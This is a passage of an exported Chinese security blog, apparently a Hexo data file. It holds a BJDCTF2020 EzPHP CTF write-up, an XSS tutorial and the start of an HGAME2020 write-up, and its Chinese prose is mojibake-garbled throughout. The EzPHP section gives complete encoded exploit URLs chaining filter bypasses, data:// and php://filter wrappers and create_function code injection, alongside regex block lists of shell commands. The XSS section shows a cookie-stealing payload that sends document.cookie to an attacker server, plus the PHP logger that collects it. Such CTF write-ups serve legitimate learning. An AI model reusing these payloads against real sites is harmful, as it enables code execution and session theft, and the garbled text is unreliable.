$_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; &#125; &#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value)) die(&#x27;fxck you! I hate English!&#x27;); &#125; &#125; if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;) die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123; die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i&#x27;, $arg) ) &#123; die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); &#125; else &#123; include &quot;flag.php&quot;; $code(&#x27;&#x27;, $arg); &#125; ?&gt; è¿™é“é¢˜è€ƒçš„çŸ¥è¯†ç‚¹æ¯”è¾ƒå¤šï¼Œåˆ†å¼€è®°ä¸€ä¸‹ $_SERVER[â€˜QUERY_STRINGâ€™]åŒ¹é…ç»•è¿‡$_SERVER[&#39;QUERY_STRING&#39;]è¿”å›urlä¸­æŸ¥è¯¢çš„å­—ç¬¦ä¸²ï¼Œä¸æ­¤ç±»ä¼¼çš„è¿˜æœ‰ï¼š $_SERVER[&#39;REQUEST_URI&#39;]è¿”å›è®¿é—®æ­¤é¡µé¢æ‰€éœ€çš„URI $_SERVER[&#39;SCRIPT_NAME&#39;]è¿”å›åŒ…å«å½“å‰è„šæœ¬çš„è·¯å¾„ $_SERVER[&#39;PHP_SELF&#39;]å½“å‰æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å ä¸¾ä¸ªä¾‹å­ï¼š(æµè§ˆå™¨è‡ªåŠ¨å°†fileçš„urlç¼–ç è§£ç äº†) å¯ä»¥çœ‹åˆ°ï¼Œ$_SERVER[&#39;QUERY_STRING&#39;]å’Œ$_SERVER[&#39;REQUEST_URI&#39;]åœ¨ä¼ è¾“æ—¶ä¸ä¼šurlè§£ç ï¼Œè€Œ$_GET,$_POSTä¼šurlè§£ç ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥urlç¼–ç ç»•è¿‡ä¸‹é¢ä»£ç ï¼š 12345if($_SERVER) &#123; if ( preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]) ) die(&#x27;You seem to want to do something bad?&#x27;); &#125; å­—ç¬¦ä¸²åŒ¹é…ç»•è¿‡123if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;&#125; ç”±äºæ²¡æœ‰/sä¿®é¥°ç¬¦ç”¨æ¥åœ¨åŒ¹é…æ—¶åŒ¹é…æ¢è¡Œç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨%0aæ¢è¡Œæ±¡æŸ“ç»•è¿‡ $_REQUESTå­—æ¯åŒ¹é…ç»•è¿‡123456if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value)) die(&#x27;fxck you! I hate English!&#x27;); &#125; &#125; ä¹‹å‰çš„å‚æ•°éƒ½æ˜¯GETå‹çš„ï¼Œè€ŒPOSTçš„ä¼˜å…ˆçº§æ¯”GETçš„è¦é«˜ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥POSTåŒæ ·åç§°æ»¡è¶³æ¡ä»¶çš„å€¼ï¼Œæ¯”å¦‚æ•°å­—, æ•°ç»„ç±»å‹çš„æ•°æ®ä¸éœ€è¦POSTï¼Œpreg_match()åªèƒ½åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•°ç»„å¾—ä»¥ç»•è¿‡ file_get_contentsæ¯”å¯¹ç»•è¿‡12if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;) die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;); åˆšå¼€å§‹æƒ³çš„æ˜¯php://inputï¼Œåæ¥å‘ç°è¦POSTæ•°æ®ï¼Œå› æ­¤ä¾¿ä¸èƒ½ç”¨äº†ï¼Œè¿™é‡Œå¯ä»¥ç”¨data://ï¼Œç¤ºä¾‹ï¼š 12data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D; sha1æ¯”è¾ƒç»•è¿‡123456if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123; die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);&#125; ç›´æ¥æ•°ç»„ç»•è¿‡ï¼Œæˆ–è€…sha1ç¢°æ’ extractå˜é‡è¦†ç›–å› ä¸ºextract()å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ï¼Œé’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¼ æ•°ç»„ï¼Œå³flag[code]å’Œflag[arg]çš„å½¢å¼ create_functionä»£ç æ³¨å…¥1234567if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i&#x27;, $arg) ) &#123; die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); &#125; else &#123; include &quot;flag.php&quot;; $code(&#x27;&#x27;, $arg); &#125; æœ€åä¸€ä¸ªè¿‡æ»¤æˆ‘ä»¬å¯ä»¥ç”¨create_function()ç»•è¿‡: 12&lt;?php$myFunc = create_function(&#x27;$a, $b&#x27;, &#x27;return($a+$b);&#125;eval($_POST[1]);\\\\&#x27;); æ‰§è¡Œæ—¶ç›¸å½“äºï¼š 1234function myFunc($a, $b)&#123; return $a+$b;&#125;eval($_POST[1]);//&#125; payloadå…ˆçœ‹ä¸‹æ‰€æœ‰å˜é‡: 1231nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;POST: debu&#x3D;1&amp;passwd&#x3D;1&amp;file&#x3D;1 è¯»æºç ï¼š 1231nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;POSTï¼š debu&#x3D;1&amp;passwd&#x3D;1&amp;file&#x3D;1 è¿™é‡Œç”¨çš„æ˜¯å–åç»•è¿‡ï¼Œè„šæœ¬ï¼š 12345678&lt;?php$a = &quot;p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = 1 f l a g . p h p&quot;;$arr1 = explode(&#x27; &#x27;, $a);echo &quot;&lt;br&gt;~(&quot;;foreach ($arr1 as $key =&gt; $value) &#123; echo &quot;%&quot;.bin2hex(~$value);&#125;echo &quot;)&lt;br&gt;&quot;; æœ‰ç‚¹éš¾é¡¶ï¼Œå‡ºé¢˜å¸ˆå‚…å¤ªå¼ºäº†ï¼Œè„‘ç“œå­å—¡å—¡çš„~ éé¢„æœŸè§£define+fopen()+fgets()æ²¡banæ‰fopen()ï¼Œå¯ä»¥fgets()è¯»å–æ–‡ä»¶ï¼Œä½†æ˜¯è¿™ä¸ªæ–‡ä»¶æŒ‡é’ˆéœ€è¦ç§»åŠ¨å°±ä¸èƒ½è¯»å–å®Œæ•´æ–‡ä»¶ï¼Œ$è¢«ç¦æ— æ³•å®šä¹‰å˜é‡ï¼Œæœ€åæµ‹è¯•æ— æœåäº¤ç»™shanaå¸ˆå‚…ï¼Œè¢«shanaå¸ˆå‚…æ•´å‡ºæ¥äº†ï¼ˆttttqlï¼‰ï¼Œç”¨å¸¸é‡ï¼ŒPayloadï¼š 1define(aaa,fopen(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f),r))ï¼›while(!feof(aaa))var_dump(fgets(aaa));fclose(aaa); éé¢„æœŸè§£æ•°ç»„æ“ä½œåŠ äº†ä¸ªå‚æ•°ï¼Œä¼ ä¸Šå»ä¼ªåè®®ï¼Œç„¶åget_defined_vars()æ•°ç»„è·å–åˆ°è¿™ä¸ªä¼ªåè®®æ”¾åˆ°require()é‡ŒåŒ…å«ï¼Œpayloadï¼š 1234?deb%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=%64%61%74%61%3a%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;rce=%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%72%65%61%64%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%65%6e%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%72%65%61%31%66%6c%34%67%2e%70%68%70&amp;rce2=r&amp;sha%6e%61[]=a&amp;pa%73sw%64[]=b&amp;fla%67[co%64e]=create_function&amp;fla%67[ar%67]=;&#125;require(get_defined_vars()[_GET][rce]);%0a//è§£ç åï¼š?debu=aqua_is_cute&amp;file=data:,debu_debu_aqua&amp;rce=php://filter/read=convert.base64-encode/resource=rea1fl4g.php&amp;rce2=r&amp;shana[]=a&amp;passwd[]=b&amp;flag[code]=create_function&amp;flag[arg]=;&#125;require(get_defined_vars()[_GET][rce]);// å‚è€ƒï¼š https://www.gem-love.com/websecurity/770.html http://www.gtfly.top/2020/01/30/BJDCTF2020-EzPHP.html","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"BJDCTF","slug":"BJDCTF","permalink":"http://www.m00nback.xyz/tags/BJDCTF/"}]},{"title":"xssæ¼æ´åŠå…¶åˆ©ç”¨æ–¹å¼","slug":"xssæ¼æ´åŠå…¶åˆ©ç”¨æ–¹å¼","date":"2020-01-27T15:02:08.000Z","updated":"2020-02-06T06:59:42.919Z","comments":true,"path":"2020/01/27/xssæ¼æ´åŠå…¶åˆ©ç”¨æ–¹å¼/","link":"","permalink":"http://www.m00nback.xyz/2020/01/27/xss%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†xssæ¼æ´åŠå…¶åˆ©ç”¨æ–¹å¼ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†xssæ¼æ´åŠå…¶åˆ©ç”¨æ–¹å¼ï¼ ä»€ä¹ˆæ˜¯xss?XSSæ˜¯è·¨ç«™è„šæœ¬æ”»å‡»(Cross Site Scripting)ï¼Œå’Œå±‚å æ ·å¼è¡¨(Cascading Style Sheets, CSS)çš„ç¼©å†™æ··æ·†ï¼Œæ•…å°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸ºXSSã€‚æ¶æ„æ”»å‡»è€…å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„Scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚ xssåˆ†ç±»åå°„å‹xssåå°„å‹xssä¸€èˆ¬å‡ºç°åœ¨URLå‚æ•°ä¸­åŠç½‘ç«™æœç´¢æ ä¸­ï¼Œç”±äºéœ€è¦ç‚¹å‡»åŒ…å«æ¶æ„ä»£ç çš„URLæ‰å¯ä»¥è§¦å‘ï¼Œå¹¶ä¸”åªèƒ½è§¦å‘ä¸€æ¬¡ï¼Œæ‰€ä»¥ä¹Ÿè¢«ç§°ä¸ºâ€œéæŒä¹…æ€§xssâ€ ä¸¾ä¸ªä¾‹å­ï¼š 123456789&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss&quot;&#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;test&quot;&#x2F;&gt;&lt;&#x2F;form&gt;&lt;?php$xss &#x3D; @$_GET[&#39;xss&#39;];if($xss!&#x3D;&#x3D;null)&#123; echo $xss;&#125; æˆ‘ä»¬åœ¨è¾“å…¥æ¡†è¾“å…¥&lt;script&gt;alert(1)&lt;/script&gt;å°±æˆåŠŸè§¦å‘äº†å¼¹æ¡† åå°„å‹ XSS çš„æ•°æ®æµå‘æ˜¯ï¼šæµè§ˆå™¨ -&gt; åç«¯ -&gt; æµè§ˆå™¨ å­˜å‚¨å‹xsså­˜å‚¨å‹xssä¸€å‡ºç°åœ¨ç½‘ç«™ç•™è¨€æ¿ï¼Œè¯„è®ºå¤„ï¼Œä¸ªäººèµ„æ–™å¤„ç­‰éœ€è¦ç”¨æˆ·å¯ä»¥å¯¹ç½‘ç«™å†™å…¥æ•°æ®çš„åœ°æ–¹ã€‚æ”»å‡»è€…å†™å…¥ä¸€æ®µçªƒå–cookieçš„æ¶æ„JavaScriptä»£ç åˆ°è¯„è®ºå¤„ï¼Œè¿™æ®µæ¶æ„ä»£ç ä¼šå†™å…¥æ•°æ®åº“ï¼Œå½“å…¶ä»–ç”¨æˆ·æµè§ˆè¿™ä¸ªå†™å…¥ä»£ç çš„é¡µé¢æ—¶ï¼Œç½‘ç«™ä»æ•°æ®åº“ä¸­è¯»å–æ¶æ„ä»£ç æ˜¾ç¤ºåˆ°ç½‘é¡µä¸­è¢«æµè§ˆå™¨æ‰§è¡Œï¼Œå¯¼è‡´ç”¨æˆ·cookieè¢«çªƒå–ï¼Œæ”»å‡»è€…æ— éœ€å—å®³è€…å¯†ç å³å¯ç™»å½•è´¦æˆ·ï¼Œæ‰€ä»¥ä¹Ÿè¢«ç§°ä½œâ€œæŒä¹…æ€§xssâ€ã€‚æŒä¹…æ€§xssæ¯”åå°„å‹xsså±å®³è¦å¤§çš„å¤š ä¸¾ä¸ªä¾‹å­ï¼š 12345678910111213&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss&quot;&#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;test&quot;&#x2F;&gt;&lt;&#x2F;form&gt;&lt;?php$xss&#x3D;@$_POST[&#39;xss&#39;];mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123&quot;);mysql_select_db(&quot;xss&quot;);if($xss!&#x3D;&#x3D;null)&#123; $sql&#x3D;&quot;insert into temp(id,payload) values(&#39;1&#39;,&#39;$xss&#39;)&quot;; $result&#x3D;mysql_query($sql); echo $result;&#125; ?&gt; ä¸ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸­ï¼Œè€Œæ˜¯æ’å…¥åˆ°äº†æ•°æ®åº“ï¼Œå­˜å‚¨å‹ XSS çš„æ‰§è¡Œä½ç½®é€šå¸¸ä¸åŒäºè¾“å…¥ä½ç½® å­˜å‚¨å‹ XSS çš„æ•°æ®æµå‘æ˜¯ï¼šæµè§ˆå™¨-&gt; åç«¯-&gt; æ•°æ®åº“-&gt; åç«¯-&gt; æµè§ˆå™¨ DOMå‹xssDOM xssæ˜¯åŸºäºdomæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼Œå‰ç«¯è„šæœ¬é€šè¿‡domåŠ¨æ€ä¿®æ”¹é¡µé¢ï¼Œç”±äºä¸ä¸æœåŠ¡ç«¯è¿›è¡Œäº¤äº’ï¼Œè€Œä¸”ä»£ç æ˜¯å¯è§çš„ï¼Œä»å‰ç«¯è·å–domä¸­çš„æ•°æ®åœ¨æœ¬åœ°æ‰§è¡Œã€‚å¸¸è§çš„å¯ä»¥æ“çºµdomçš„å¯¹è±¡ï¼šURLï¼Œlocaltion,referrerç­‰ ä¸¾ä¸ªä¾‹å­ï¼š 1234567891011&lt;?phperror_reporting(0); &#x2F;&#x2F;ç¦ç”¨é”™è¯¯æŠ¥å‘Š$name &#x3D; $_GET[&quot;name&quot;];?&gt;&lt;input id&#x3D;&quot;text&quot; type&#x3D;&quot;text&quot; value&#x3D;&quot;&lt;?php echo $name;?&gt;&quot; &#x2F;&gt;&lt;div id&#x3D;&quot;print&quot;&gt;&lt;&#x2F;div&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;var text &#x3D; document.getElementById(&quot;text&quot;); var print &#x3D; document.getElementById(&quot;print&quot;);print.innerHTML &#x3D; text.value; &#x2F;&#x2F; è·å– textçš„å€¼ï¼Œå¹¶ä¸”è¾“å‡ºåœ¨printå†…ã€‚è¿™é‡Œæ˜¯å¯¼è‡´xssçš„ä¸»è¦åŸå› ã€‚&lt;&#x2F;script&gt; DOMå‹XSSçš„æ•°æ®æµå‘æ˜¯ï¼šURL--&gt;æµè§ˆå™¨ xssæ¼æ´åˆ©ç”¨ç›—cookieå¯ä»¥åœ¨è‡ªå·±vpsä¸Šç®€å•æ­ä¸€ä¸ªï¼Œindex.phpå†™å…¥ä¸‹é¢å†…å®¹ 123&lt;?phpfile_put_contents(&#x27;log.txt&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;].&quot;\\n&quot;,FILE_APPEND);?&gt; è¿™æ ·å°±ä¼šå°†è¯·æ±‚çš„å†…å®¹å†™å…¥log.txté‡Œäº†ï¼Œå¯ä»¥æ„é€ ç±»ä¼¼ä¸‹é¢çš„payload: 123&lt;script&gt;new Image().src=&quot;http://vps/?cookie=&quot;+document.cookie;&lt;/script&gt; xssç»•è¿‡payloadhttps://xz.aliyun.com/t/2936 https://blog.csdn.net/qq_29277155/article/details/51320064 https://www.freebuf.com/articles/web/153055.html CSPä»€ä¹ˆæ˜¯CSP?CSPçš„å…¨ç§°Content Security Policyï¼Œç”¨æ¥é˜²å¾¡XSSæ”»å‡»çš„æŠ€æœ¯ã€‚å®ƒæ˜¯ä¸€ç§ç”±å¼€å‘è€…å®šä¹‰çš„å®‰å…¨æ€§æ”¿ç­–æ€§ç”³æ˜ï¼Œé€šè¿‡CSPæŒ‡å®šå¯ä¿¡çš„å†…å®¹æ¥æºï¼Œè®©WEBå¤„äºä¸€ä¸ªå®‰å…¨çš„è¿è¡Œç¯å¢ƒä¸­ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š 1Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; ä¸€ä¸ªCSPå¤´ç”±å¤šç»„CSPç­–ç•¥ç»„æˆï¼Œä¸­é—´ç”±åˆ†å·åˆ†éš”ï¼Œå…¶ä¸­æ¯ä¸€ç»„ç­–ç•¥åŒ…å«ä¸€ä¸ªç­–ç•¥æŒ‡ä»¤å’Œä¸€ä¸ªå†…å®¹æºåˆ—è¡¨ ç­–ç•¥æŒ‡ä»¤æœ‰å¦‚ä¸‹é€‰é¡¹ï¼š æŒ‡ä»¤ è¯´æ˜ default-src å®šä¹‰èµ„æºé»˜è®¤åŠ è½½ç­–ç•¥ connect-src å®šä¹‰ Ajaxã€WebSocket ç­‰åŠ è½½ç­–ç•¥ font-src å®šä¹‰ Font åŠ è½½ç­–ç•¥ frame-src å®šä¹‰ Frame åŠ è½½ç­–ç•¥ img-src å®šä¹‰å›¾ç‰‡åŠ è½½ç­–ç•¥ media-src å®šä¹‰ &lt;audio&gt;ã€&lt;video&gt; ç­‰å¼•ç”¨èµ„æºåŠ è½½ç­–ç•¥ object-src å®šä¹‰ &lt;applet&gt;ã€&lt;embed&gt;ã€&lt;object&gt; ç­‰å¼•ç”¨èµ„æºåŠ è½½ç­–ç•¥ script-src å®šä¹‰ JS åŠ è½½ç­–ç•¥ style-src å®šä¹‰ CSS åŠ è½½ç­–ç•¥ sandbox å€¼ä¸º allow-formsï¼Œå¯¹èµ„æºå¯ç”¨ sandbox report-uri å€¼ä¸º /report-uriï¼Œæäº¤æ—¥å¿— å†…å®¹æºæœ‰å¦‚ä¸‹é€‰é¡¹ï¼š æº è¯´æ˜ * é€šé…ç¬¦ï¼Œå…è®¸ä»»ä½•URLï¼Œé™¤äº†data: blob: filesystem: schemes *.foo.com å…è®¸åŠ è½½foo.comå­åŸŸçš„èµ„æº abc.foo.com åªèƒ½åŠ è½½è¿™ä¸ªåŸŸåä¸‹çš„èµ„æº https://a.com åªèƒ½ç”¨HTTPSåŠ è½½åŸŸåä¸‹çš„èµ„æº https: é€šè¿‡HTTPSå¯ä»¥åŠ è½½ä»»æ„åŸŸåä¸‹çš„èµ„æº â€˜noneâ€™ ä»£è¡¨ç©ºé›†,å³ä¸åŒ¹é…ä»»ä½•URL,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ â€˜selfâ€™ ä»£è¡¨å’Œæ–‡æ¡£åŒæº,åŒ…æ‹¬ç›¸åŒçš„URLåè®®å’Œç«¯å£å·,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ â€˜unsafe-inlineâ€™ å…è®¸ä½¿ç”¨å†…è”èµ„æº,å¦‚å†…è”çš„&lt;script&gt;å…ƒç´ ã€javascript: URLã€å†…è”çš„äº‹ä»¶å¤„ç†å‡½æ•°å’Œå†…è”çš„&lt;style&gt;å…ƒç´ ,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ â€˜unsafe-evalâ€™ å…è®¸ä½¿ç”¨ eval() ç­‰é€šè¿‡å­—ç¬¦ä¸²åˆ›å»ºä»£ç çš„æ–¹æ³•,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ data: å…è®¸data: URIä½œä¸ºå†…å®¹æ¥æº mediastream: å…è®¸mediastream: URIä½œä¸ºå†…å®¹æ¥æº å†…å®¹æºæœ‰ä¸‰ç§ï¼šæºåˆ—è¡¨ã€å…³é”®å­—å’Œæ•°æ®ï¼Œå…¶ä¸­ï¼Œ.foo.comï¼Œabc.foo.comï¼Œhttps://a.com ï¼Œhttps:å±äºæºåˆ—è¡¨ã€‚â€™noneâ€™ï¼Œâ€™selfâ€™ï¼Œâ€™unsafe-inlineâ€™ï¼Œâ€™unsafe-evalâ€™å±äºå…³é”®å­—ã€‚data:ï¼Œmediastream:å±äºæ•°æ® è¿™é‡Œæœ‰ä¸ªCSPæ˜¯å¦å®‰å…¨çš„æ£€æµ‹ç½‘ç«™ï¼šhttps://csp-evaluator.withgoogle.com bypass CSPhttps://hurricane618.me/2018/06/30/csp-bypass-summary/ https://xz.aliyun.com/t/5084 https://zhuanlan.zhihu.com/p/94246164?utm_source=com.tencent.tim&amp;utm_medium=social&amp;utm_oi=910631635467264000","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"xss","slug":"xss","permalink":"http://www.m00nback.xyz/tags/xss/"}]},{"title":"HGAME2020æ¯”èµ›éƒ¨åˆ†writeup","slug":"HGAMEæ¯”èµ›éƒ¨åˆ†writeup","date":"2020-01-23T09:29:13.000Z","updated":"2020-02-24T16:17:18.985Z","comments":true,"path":"2020/01/23/HGAMEæ¯”èµ›éƒ¨åˆ†writeup/","link":"","permalink":"http://www.m00nback.xyz/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/","excerpt":"æœ¬ç¯‡åšå®¢è®°å½•äº†HGAMEä¸Šwebé¢˜ç›®å’Œmiscé¢˜ç›®çš„writeupï¼","text":"æœ¬ç¯‡åšå®¢è®°å½•äº†HGAMEä¸Šwebé¢˜ç›®å’Œmiscé¢˜ç›®çš„writeupï¼ Week1webCosmos çš„åšå®¢æ‰“å¼€æç¤ºgithubï¼Œè¿˜ç€é‡æ ‡äº†ç‰ˆæœ¬ç®¡ç†å·¥å…·ï¼Œgitæºç æ³„éœ²ä¹Ÿæ²¡æ¢å¤å‡ºç¥é­”æœ‰ç”¨çš„ä¸œè¥¿ dirsearchæ‰«ä¸‹ç›®å½•ï¼Œå‘ç°å¥½å¤šå’Œgitç›¸å…³çš„æ–‡ä»¶å’Œç›®å½• åœ¨/.git/configç›®å½•ä¸‹å‘ç°ç½‘ç«™çš„githubåœ°å€ ä¹Ÿå¯ä»¥ç”¨githack(æœ‰ä¸¤ä¸ª)ï¼šhttps://github.com/BugScanTeam/GitHack è€Œä¸æ˜¯è¿™ä¸ªï¼šhttps://github.com/lijiejie/GitHack å°†ä»“åº“ä¿¡æ¯è¿˜åŸä¸‹æ¥ï¼Œç„¶ååœ¨æœ‰.gitæ–‡ä»¶å¤¹ç›®å½•ç”¨git remote -v åœ¨Commitsé‡Œçš„ç¬¬äºŒä¸ªæ‰¾åˆ°base64ç¼–ç çš„flag æ¥ å¤´ éœ¸ ç‹æ‰“å¼€å‘ç°æç¤ºYou need to come from https://vidar.club/ï¼Œæƒ³åˆ°è®¾ç½®Refererï¼Œå‘ç°è®¾ç½®å®Œè¿˜è¦è®¾ç½®X-Forwarded-For,User-Agent,è¯·æ±‚æ–¹å¼æ”¹ä¸ºPOST,If-Unmodified-Sinceï¼Œæœ€ç»ˆè¯·æ±‚ Code Worldæ‰“å¼€å‘ç°è·³åˆ°new.phpå¹¶æç¤º403 Forbiddenï¼ŒæŠ“åŒ…çœ‹ä¸‹ï¼Œåœ¨è¯·æ±‚æ ¹ç›®å½•æ—¶å‘ç°æç¤º405 Not Allowed æœäº†æœ405çš„åŸå› ï¼šApacheã€IISã€Nginxç­‰ç»å¤§å¤šæ•°webæœåŠ¡å™¨ï¼Œéƒ½ä¸å…è®¸é™æ€æ–‡ä»¶å“åº”POSTè¯·æ±‚ è§£å†³ï¼šå°†postè¯·æ±‚æ”¹ä¸ºgetè¯·æ±‚ è¯•ç€æ”¹ä¸‹è¯·æ±‚æ–¹å¼ï¼Œæ”¹ä¸ºPOSTå‘ç° æç¤ºè¦ä¸¤ä¸ªæ•°ç›¸åŠ ä¸º10ï¼Œè¯•äº†è¯•å‘ç°GETå’ŒPOSTéƒ½è¦ä¼ å‚ï¼Œè¦æ³¨æ„åŠ å·è¦urlç¼–ç  ğŸ”å°¼æ³°ç«å¾ˆå¡è¿™é¢˜ï¼Œæ‰“å¼€æŠ“ä¸‹æ¸¸æˆä¹‹åçš„åŒ…ï¼Œå‘ç°ä¼ 